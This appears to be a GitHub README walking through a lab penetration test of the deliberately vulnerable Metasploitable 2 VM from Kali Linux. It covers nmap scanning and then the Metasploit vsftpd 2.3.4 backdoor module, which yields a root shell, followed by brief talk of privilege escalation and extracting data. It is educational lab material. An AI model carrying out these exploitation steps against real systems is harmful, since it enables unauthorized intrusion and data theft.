# WebPenetration
Preparation:
Installed Kali Linux as the attacker machine on the host system using the virtualization software.
Downloaded and imported the Metasploitable 2 virtual machine into the virtualization software.
Network Configuration:
Set up a network connection between the attacker machine (Kali Linux) and the target machine
(Metasploitable 2). Ensured that both machines can communicate with each other.
Run "ifconfig" command in the Metasploitable2 to see the ip address of that machine
Scanning and Enumeration:
Used Nmap to scan the target machine for open ports and services: nmap -sV -O "ip address"
 or nmap -T4 -A -V "ip address"
Here I've used the Zenmap for the graphical use:
<img width="960" alt="o3xWzN1mr8" src="https://github.com/arifhasnat3po/WebPenetration/assets/63786513/da7fa8ae-a6bf-4907-97d4-fe989985a0ba">



Exploitation with Metasploit Framework:
Launched the Metasploit console: msfconsole
Searched for suitable exploits based on the identified vulnerabilities: search <service_name>
Selected an exploit and configured the necessary options: use <exploit>
Set the target IP: set RHOSTS <target_IP>
Executed the exploit: exploit
Post-Exploitation:
Explored the compromised system and escalated privileges if possible. Extracted sensitive information or
performed additional attacks on the compromised system.
  

We now have the information we require to exploit the vulnerable system.We will be exploiting some of the vulnerabilities we have just discovered above.

 

FTP port 21 exploit
Our first vulnerability to exploit will be FTP which runs on port 21.

 

Step-1: Launching Metasploit and searching for exploit
We fire up our Metasploit using:
  
msfconsole
command and search for vulnerability relating to vsftpd. (Metasploit has the known vulnerabilities exploit database hence makes it easier for a pen-tester to load and use the exploit). On searching for exploits related to FTP services, we find an exploit “exploit/unix/ftp/vsftpd_234_backdoor”

Step-2: Using the found exploit to attack target system
We now have to use the exploit to attack out target system. We enter command to use the backdoor.
  
use exploit/unix/ftp/vsftpd_234_backdoor
set the remote host
  
set RHOST 192.168.56.102
to our target system IP address and run the exploit
<img width="960" alt="ucpqCGxS12" src="https://github.com/arifhasnat3po/WebPenetration/assets/63786513/c612e61a-6b3f-4ad7-921b-d49567b5ae5a">
 
Step-3: Checking privileges from the shell
We get a shell from the target system and we can test by checking which account the shell is on. The shell is running on the system with root privileges. From the shell you can access and make changes to our target system.
  
  
  
